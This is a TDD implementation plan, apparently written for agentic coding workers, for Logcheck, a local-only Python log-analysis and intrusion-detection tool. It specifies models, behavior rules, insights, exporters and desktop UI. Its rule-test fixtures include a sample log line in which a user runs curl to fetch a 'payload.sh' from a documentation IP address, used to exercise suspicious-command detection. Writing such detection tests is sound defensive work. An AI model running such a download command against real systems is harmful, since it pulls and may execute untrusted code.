# Comprehensive Logcheck Iteration Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a polished local Logcheck analysis workspace with enhanced local parsing diagnostics, deterministic behavior rules, evidence-based insights, and richer exports while preserving the local-only safety boundary.

**Architecture:** Keep the current local pipeline and add one deterministic insight layer after analysis. Backend changes are implemented first so desktop, CLI, and exporters can render the same enriched result data.

**Tech Stack:** Python, PyQt6, `unittest`, local JSON/CSV/Markdown exporters, OpenSpec/Comet workflow.

---

change: comprehensive-logcheck-iteration
design-doc: docs/superpowers/specs/2026-06-05-comprehensive-logcheck-iteration-design.md
base-ref: 00d81df06526b229653fe17d95ee95215ec6bc65

---

## File Structure

- Modify `logcheck/models.py`: add optional fields or dataclasses for parser diagnostics, finding reasons, insight summary, entity profiles, timeline highlights, and suggestions.
- Modify `logcheck/parsers.py`: preserve richer source context and produce diagnostics for empty or unsupported files where feasible.
- Modify `logcheck/rules.py`: add deterministic behavior-pattern findings and validation for enhanced local rule config.
- Modify `logcheck/config.py`: parse and validate enhanced local rule settings.
- Modify `logcheck/analysis.py`: orchestrate parser diagnostics, detection, summaries, and insight generation.
- Create `logcheck/insights.py`: derive local investigation insights from `AnalysisResult`.
- Modify `logcheck/exporters.py`: add insight and source-context metadata to JSON/Markdown while preserving CSV compatibility.
- Modify `logcheck/desktop.py`: polish layout, show local insights, improve source diagnostics, and preserve local-only controls.
- Modify `logcheck/cli.py`: keep current commands stable while optionally printing concise insights.
- Modify tests under `tests/`: add focused TDD tests for every behavior slice.

## Task 1: Backend Models and Parser Diagnostics

**Files:**
- Modify: `logcheck/models.py`
- Modify: `logcheck/parsers.py`
- Test: `tests/test_models.py`
- Test: `tests/test_parsers.py`

- [ ] **Step 1: Write failing model tests**

Add tests that pin optional diagnostic and reason fields without breaking existing construction:

```python
def test_analysis_result_can_carry_diagnostics_and_insights():
    result = AnalysisResult()

    self.assertEqual(result.diagnostics, [])
    self.assertIsNone(result.insights)


def test_finding_exports_reason_fields_when_present():
    finding = Finding(
        rule_id="behavior.suspicious_command",
        severity="high",
        explanation="Suspicious command execution",
        evidence=["curl http://example.invalid"],
        severity_reason="Suspicious command matched high-risk indicator",
        confidence_reason="Exact command keyword match",
    )

    data = finding.to_dict()

    self.assertEqual(data["severity_reason"], "Suspicious command matched high-risk indicator")
    self.assertEqual(data["confidence_reason"], "Exact command keyword match")
```

- [ ] **Step 2: Run model tests and verify failure**

Run: `python -m unittest tests.test_models`

Expected: tests fail because `AnalysisResult.diagnostics`, `AnalysisResult.insights`, `Finding.severity_reason`, and `Finding.confidence_reason` do not exist yet.

- [ ] **Step 3: Implement minimal model additions**

Update dataclasses in `logcheck/models.py` with default-compatible fields:

```python
@dataclass
class Finding:
    rule_id: str
    severity: str
    explanation: str
    evidence: list[str] = field(default_factory=list)
    source_file: str | None = None
    line_number: int | None = None
    timestamp: datetime | None = None
    source_address: str | None = None
    actor: str | None = None
    target: str | None = None
    matched_keyword: str | None = None
    count: int | None = None
    severity_reason: str | None = None
    confidence_reason: str | None = None
```

Add those fields to `to_dict()`. Add compatible fields to `AnalysisResult`:

```python
@dataclass
class AnalysisResult:
    events: list[Event] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    diagnostics: list[str] = field(default_factory=list)
    insights: object | None = None
```

- [ ] **Step 4: Write failing parser diagnostics tests**

Add tests in `tests/test_parsers.py`:

```python
def test_empty_file_produces_no_events_without_crashing(self):
    with TemporaryDirectory() as tmp:
        path = Path(tmp) / "empty.log"
        path.write_text("", encoding="utf-8")

        events = parse_files([path])

    self.assertEqual(events, [])


def test_unknown_lines_preserve_source_context(self):
    with TemporaryDirectory() as tmp:
        path = Path(tmp) / "app.log"
        path.write_text("not a known auth line\n", encoding="utf-8")

        events = parse_files([path])

    self.assertEqual(events[0].source_file, str(path))
    self.assertEqual(events[0].line_number, 1)
    self.assertEqual(events[0].category, "unknown")
    self.assertEqual(events[0].raw, "not a known auth line")
```

- [ ] **Step 5: Run parser tests and verify failure or current behavior**

Run: `python -m unittest tests.test_parsers`

Expected: context preservation may already pass; empty-file diagnostics will be handled later through analysis if parser returns only events.

- [ ] **Step 6: Implement minimal parser/context fixes**

Keep parser behavior conservative. If `parse_files()` already preserves source context, do not refactor it. Add only missing metadata or helpers needed by tests.

- [ ] **Step 7: Verify and commit**

Run: `python -m unittest tests.test_models tests.test_parsers`

Expected: all model and parser tests pass.

Commit:

```bash
git add logcheck/models.py logcheck/parsers.py tests/test_models.py tests/test_parsers.py
git commit -m "feat: add analysis metadata foundations"
```

## Task 2: Enhanced Local Rule Detection

**Files:**
- Modify: `logcheck/config.py`
- Modify: `logcheck/rules.py`
- Test: `tests/test_rules.py`

- [ ] **Step 1: Write failing suspicious command behavior test**

Add in `tests/test_rules.py`:

```python
def test_suspicious_command_finding_includes_reasons(self):
    events = [
        Event(
            source_file="app.log",
            line_number=1,
            raw="user ran curl http://198.51.100.7/payload.sh",
            category="command",
            actor="alice",
            source_address="192.0.2.10",
            message="curl http://198.51.100.7/payload.sh",
        )
    ]

    findings = detect_findings(events, default_config())

    suspicious = [finding for finding in findings if finding.rule_id.startswith("behavior.")]
    self.assertTrue(suspicious)
    self.assertIsNotNone(suspicious[0].severity_reason)
    self.assertIsNotNone(suspicious[0].confidence_reason)
```

- [ ] **Step 2: Run rule test and verify failure**

Run: `python -m unittest tests.test_rules`

Expected: new test fails because behavior-pattern findings or reason fields are not emitted.

- [ ] **Step 3: Implement minimal behavior detection**

In `logcheck/rules.py`, after existing keyword findings, add deterministic behavior detection for suspicious command indicators already present in the default keywords. Emit a `Finding` with:

```python
Finding(
    rule_id="behavior.suspicious_command",
    severity="high",
    explanation="Suspicious command execution indicator observed.",
    evidence=[event.raw],
    source_file=event.source_file,
    line_number=event.line_number,
    timestamp=event.timestamp,
    source_address=event.source_address,
    actor=event.actor,
    target=event.target,
    matched_keyword=matched,
    severity_reason="Suspicious command indicators are high priority for local review.",
    confidence_reason="Exact configured suspicious command indicator matched the event text.",
)
```

- [ ] **Step 4: Write failing multi-signal actor test**

Add:

```python
def test_multi_signal_actor_creates_correlated_behavior_finding(self):
    events = [
        Event("auth.log", 1, "Failed password for root from 192.0.2.10", category="auth", actor="root", source_address="192.0.2.10", message="Failed password"),
        Event("auth.log", 2, "Invalid user admin from 192.0.2.10", category="auth", actor="admin", source_address="192.0.2.10", message="Invalid user"),
    ]

    findings = detect_findings(events, default_config())

    self.assertTrue(any(finding.rule_id == "behavior.multi_signal_source" for finding in findings))
```

- [ ] **Step 5: Implement minimal correlated behavior detection**

Group emitted lower-level findings by `source_address` or `actor`. When one entity triggers two or more distinct rule IDs, emit a correlated finding with evidence from the grouped findings.

- [ ] **Step 6: Add enhanced rule validation tests**

Add config tests if enhanced config shape is introduced. Keep validation strict: invalid thresholds or unsupported behavior fields raise a clear config error.

- [ ] **Step 7: Verify and commit**

Run: `python -m unittest tests.test_rules tests.test_config`

Expected: rule and config tests pass.

Commit:

```bash
git add logcheck/rules.py logcheck/config.py tests/test_rules.py tests/test_config.py
git commit -m "feat: add explainable behavior detections"
```

## Task 3: Local Analysis Insights

**Files:**
- Create: `logcheck/insights.py`
- Modify: `logcheck/analysis.py`
- Modify: `logcheck/models.py`
- Test: `tests/test_insights.py`
- Test: `tests/test_analysis.py`

- [ ] **Step 1: Write failing insight tests**

Create `tests/test_insights.py`:

```python
import unittest

from logcheck.insights import generate_insights
from logcheck.models import AnalysisResult, Event, Finding


class InsightTests(unittest.TestCase):
    def test_generates_summary_and_entity_profile(self):
        result = AnalysisResult(
            events=[Event("auth.log", 1, "Failed password", source_address="192.0.2.10")],
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=1,
                    source_address="192.0.2.10",
                )
            ],
        )

        insights = generate_insights(result)

        self.assertEqual(insights.risk_level, "medium")
        self.assertIn("192.0.2.10", [profile.value for profile in insights.entity_profiles])
        self.assertTrue(insights.suggestions)

    def test_no_findings_produces_low_risk_summary(self):
        insights = generate_insights(AnalysisResult(events=[Event("app.log", 1, "ok")], findings=[]))

        self.assertEqual(insights.risk_level, "low")
        self.assertIn("no configured rule", insights.headline.lower())
```

- [ ] **Step 2: Run insight tests and verify failure**

Run: `python -m unittest tests.test_insights`

Expected: import fails because `logcheck.insights` does not exist.

- [ ] **Step 3: Implement insight dataclasses and generator**

Create `logcheck/insights.py`:

```python
from __future__ import annotations

from collections import Counter, defaultdict
from dataclasses import dataclass, field

from .models import AnalysisResult, Finding


@dataclass
class EntityProfile:
    kind: str
    value: str
    finding_count: int
    severity_counts: dict[str, int]
    related_rules: list[str]
    evidence: list[str] = field(default_factory=list)


@dataclass
class TimelineHighlight:
    label: str
    severity: str
    rule_id: str
    entity: str
    source: str


@dataclass
class RemediationSuggestion:
    title: str
    detail: str
    evidence: list[str] = field(default_factory=list)


@dataclass
class AnalysisInsights:
    risk_level: str
    headline: str
    evidence_count: int
    entity_profiles: list[EntityProfile] = field(default_factory=list)
    timeline: list[TimelineHighlight] = field(default_factory=list)
    suggestions: list[RemediationSuggestion] = field(default_factory=list)


def generate_insights(result: AnalysisResult) -> AnalysisInsights:
    if not result.findings:
        return AnalysisInsights(
            risk_level="low",
            headline="No configured rule patterns were detected in the analyzed local logs.",
            evidence_count=0,
            suggestions=[
                RemediationSuggestion(
                    title="Review coverage",
                    detail="Confirm the selected local logs and active rules cover the activity you intended to inspect.",
                )
            ],
        )

    severity_order = {"low": 1, "medium": 2, "high": 3, "critical": 4}
    risk_level = max((finding.severity for finding in result.findings), key=lambda value: severity_order.get(value, 0))
    profiles = _entity_profiles(result.findings)
    timeline = _timeline(result.findings)
    return AnalysisInsights(
        risk_level=risk_level,
        headline=f"{len(result.findings)} local findings require review; highest severity is {risk_level}.",
        evidence_count=sum(len(finding.evidence) for finding in result.findings),
        entity_profiles=profiles,
        timeline=timeline,
        suggestions=_suggestions(risk_level, profiles),
    )
```

Also implement small private helpers `_entity_profiles`, `_timeline`, and `_suggestions`.

- [ ] **Step 4: Integrate insights into analysis**

In `logcheck/analysis.py`, after detection:

```python
result = AnalysisResult(events=events, findings=detect_findings(events, config))
result.insights = generate_insights(result)
return result
```

- [ ] **Step 5: Verify and commit**

Run: `python -m unittest tests.test_insights tests.test_analysis`

Expected: insight and analysis tests pass.

Commit:

```bash
git add logcheck/insights.py logcheck/analysis.py logcheck/models.py tests/test_insights.py tests/test_analysis.py
git commit -m "feat: generate local analysis insights"
```

## Task 4: Export Insights and Source Context

**Files:**
- Modify: `logcheck/exporters.py`
- Test: `tests/test_exporters.py`

- [ ] **Step 1: Write failing JSON export insight test**

Add:

```python
def test_export_json_includes_insights_when_available(self):
    result = sample_result()
    result.insights = generate_insights(result)
    with TemporaryDirectory() as tmp:
        path = Path(tmp) / "analysis.json"

        export_json(result, path)

        payload = json.loads(path.read_text(encoding="utf-8"))
    self.assertIn("insights", payload)
    self.assertIn("entity_profiles", payload["insights"])
```

- [ ] **Step 2: Run exporter tests and verify failure**

Run: `python -m unittest tests.test_exporters`

Expected: new test fails because JSON exporter does not include insights.

- [ ] **Step 3: Implement insight serialization**

In `logcheck/exporters.py`, add helper:

```python
def _insights_to_dict(insights: object | None) -> dict[str, object] | None:
    if insights is None:
        return None
    return {
        "risk_level": insights.risk_level,
        "headline": insights.headline,
        "evidence_count": insights.evidence_count,
        "entity_profiles": [profile.__dict__ for profile in insights.entity_profiles],
        "timeline": [item.__dict__ for item in insights.timeline],
        "suggestions": [suggestion.__dict__ for suggestion in insights.suggestions],
    }
```

Include it in JSON only when present.

- [ ] **Step 4: Write failing Markdown insight test**

Add:

```python
def test_export_markdown_includes_insight_section(self):
    result = sample_result()
    result.insights = generate_insights(result)
    with TemporaryDirectory() as tmp:
        path = Path(tmp) / "analysis.md"

        export_markdown(result, path)

        text = path.read_text(encoding="utf-8")
    self.assertIn("## Investigation Insights", text)
    self.assertIn(result.insights.headline, text)
```

- [ ] **Step 5: Implement Markdown insight section**

Add an insights section before findings:

```python
if result.insights is not None:
    lines.extend([
        "## Investigation Insights",
        "",
        f"- Risk level: {result.insights.risk_level}",
        f"- Summary: {result.insights.headline}",
        f"- Evidence count: {result.insights.evidence_count}",
        "",
    ])
```

- [ ] **Step 6: Verify and commit**

Run: `python -m unittest tests.test_exporters`

Expected: exporter tests pass and existing CSV fields remain.

Commit:

```bash
git add logcheck/exporters.py tests/test_exporters.py
git commit -m "feat: export local investigation insights"
```

## Task 5: Desktop Insight UI and Polish

**Files:**
- Modify: `logcheck/desktop.py`
- Test: `tests/test_desktop.py`

- [ ] **Step 1: Write failing desktop insight rendering test**

Add:

```python
def test_overview_renders_analysis_insight_summary(self):
    app = QApplication.instance() or QApplication([])
    window = desktop.LogcheckDesktop()
    result = AnalysisResult(
        events=[Event("auth.log", 1, "Failed password", source_address="192.0.2.10")],
        findings=[Finding(rule_id="keyword.failed_login", severity="medium", explanation="Failed login", evidence=["Failed password"], source_address="192.0.2.10")],
    )
    result.insights = generate_insights(result)

    window._render_result(result)

    self.assertIn(result.insights.risk_level, window.insight_summary_label.text())
    self.assertIn("192.0.2.10", window.insight_summary_label.text())
    window.close()
```

- [ ] **Step 2: Run desktop test and verify failure**

Run: `python -m unittest tests.test_desktop.DesktopTests.test_overview_renders_analysis_insight_summary`

Expected: fails because `insight_summary_label` does not exist.

- [ ] **Step 3: Add Overview insight summary widget**

In `desktop.py`, add a compact insight panel to the Overview details area or below metric cards. Store label as `self.insight_summary_label` and update it in `_render_result()`.

Use concise text:

```python
summary = result.insights
self.insight_summary_label.setText(
    f"风险：{summary.risk_level}\n{summary.headline}\n证据：{summary.evidence_count} 条"
)
```

- [ ] **Step 4: Write and satisfy visual consistency tests**

Add tests that assert:

```python
self.assertNotIn(desktop.UI_TEXT["export"], [button.text() for button in overview_buttons])
self.assertIn("QFrame#panel", window._stylesheet())
self.assertIn("QScrollArea", window._stylesheet())
```

Keep these tests behavior-oriented and avoid brittle pixel checks in unit tests.

- [ ] **Step 5: Polish stylesheet/layout**

Refine:

- panel/row backgrounds so text rows do not look accidental;
- button labels for multi-file and multi-folder flows;
- empty states for no analysis, no insights, and no selected source;
- source diagnostics area if diagnostics are present.

- [ ] **Step 6: Verify and commit**

Run: `python -m unittest tests.test_desktop`

Expected: all desktop tests pass.

Commit:

```bash
git add logcheck/desktop.py tests/test_desktop.py
git commit -m "feat: polish desktop insight workflow"
```

## Task 6: CLI Summary and Safety Checks

**Files:**
- Modify: `logcheck/cli.py`
- Test: `tests/test_cli.py`
- Test: `tests/test_desktop.py`

- [ ] **Step 1: Write failing CLI insight summary test**

Add:

```python
def test_cli_prints_local_insight_summary(self):
    with TemporaryDirectory() as tmp:
        log = Path(tmp) / "auth.log"
        log.write_text("Jan  1 00:00:01 host sshd[1]: Failed password for root from 192.0.2.10 port 22 ssh2\n", encoding="utf-8")
        result = run_cli([str(log)])

    self.assertIn("Insight", result.stdout)
```

- [ ] **Step 2: Run CLI tests and verify failure**

Run: `python -m unittest tests.test_cli`

Expected: fails until CLI prints insight summary.

- [ ] **Step 3: Implement concise CLI insight output**

In `_print_summary()`, after existing summary:

```python
if result.insights is not None:
    print(f"Insight: {result.insights.headline}")
```

If `_print_summary()` currently receives only `AnalysisSummary`, change the call minimally so it can access the full result, or add a separate `_print_insights(result)`.

- [ ] **Step 4: Add local-only safety regression test**

In desktop tests, assert visible button/label text does not contain remote-control concepts:

```python
for forbidden in ["URL", "域名", "上传", "扫描", "封禁", "利用"]:
    self.assertNotIn(forbidden, visible_text)
```

- [ ] **Step 5: Verify and commit**

Run: `python -m unittest tests.test_cli tests.test_desktop`

Expected: CLI and desktop tests pass.

Commit:

```bash
git add logcheck/cli.py tests/test_cli.py tests/test_desktop.py
git commit -m "feat: surface local insights safely"
```

## Task 7: Full Verification and OpenSpec Task Completion

**Files:**
- Modify: `openspec/changes/comprehensive-logcheck-iteration/tasks.md`
- Optional Modify: course deliverable notes if an existing docs file is used

- [ ] **Step 1: Run full unit test suite**

Run: `python -m unittest discover`

Expected: all tests pass.

- [ ] **Step 2: Run OpenSpec status**

Run: `openspec status --change "comprehensive-logcheck-iteration"`

Expected: artifacts complete; implementation tasks can be checked as finished.

- [ ] **Step 3: Manual desktop verification**

Run the desktop app using the project’s existing command. Verify:

- initial and minimum window sizes show no incoherent overlap;
- Overview has no duplicate export controls;
- Log Sources supports multiple folders/files;
- insights appear after analysis;
- Export Reports still exports JSON/CSV/Markdown;
- UI exposes only local file/folder/rule/report controls.

- [ ] **Step 4: Check off OpenSpec tasks**

Update `openspec/changes/comprehensive-logcheck-iteration/tasks.md` by changing completed `- [ ]` items to `- [x]`.

- [ ] **Step 5: Commit verification**

Commit:

```bash
git add openspec/changes/comprehensive-logcheck-iteration/tasks.md
git commit -m "chore: complete comprehensive iteration tasks"
```

## Self-Review

Spec coverage:

- `analysis-insights`: Task 3 and Task 4 cover summary, profiles, timeline, and suggestions.
- `desktop-frontend`: Task 5 and Task 6 cover layout, insight rendering, source workflow, and local-only safety.
- `log-ingestion`: Task 1 covers metadata and diagnostics foundations.
- `intrusion-detection-rules`: Task 2 covers enhanced behavior rules and reasons.
- `report-export`: Task 4 covers JSON/Markdown insight exports and CSV compatibility.
- `course-deliverables`: Task 7 covers automated and manual verification evidence.

No placeholders are intentionally left. If implementation discovers a missing acceptance scenario, update the relevant OpenSpec delta and this plan before continuing.
